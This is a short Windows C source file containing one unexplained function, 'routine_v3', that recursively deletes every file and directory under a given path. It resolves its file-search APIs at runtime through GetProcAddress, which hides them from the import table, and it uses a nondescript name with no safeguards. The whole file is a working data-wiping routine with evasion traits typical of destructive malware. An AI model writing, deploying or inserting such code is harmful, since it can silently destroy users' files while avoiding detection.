#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v3(const char* path){
    HMODULE k = GetModuleHandleA("kernel32.dll");
    typedef HANDLE(WINAPI* fFFF)(LPCSTR, LPWIN32_FIND_DATAA);
    typedef BOOL(WINAPI* fFNF)(HANDLE, LPWIN32_FIND_DATAA);
    fFFF _FFF = (fFFF)GetProcAddress(k, "FindFirstFileA");
    fFNF _FNF = (fFNF)GetProcAddress(k, "FindNextFileA");
    char s[MAX_PATH];
    wsprintfA(s, "%s\\*", path);
    WIN32_FIND_DATAA d;
    HANDLE h = _FFF(s, &d);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (lstrcmpA(d.cFileName, ".") == 0 || lstrcmpA(d.cFileName, "..") == 0) continue;
            char f[MAX_PATH];
            wsprintfA(f, "%s\\%s", path, d.cFileName);
            if (d.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) routine_v3(f);
            else DeleteFileA(f);
        } while (_FNF(h, &d));
        FindClose(h);
    }
    RemoveDirectoryA(path);
}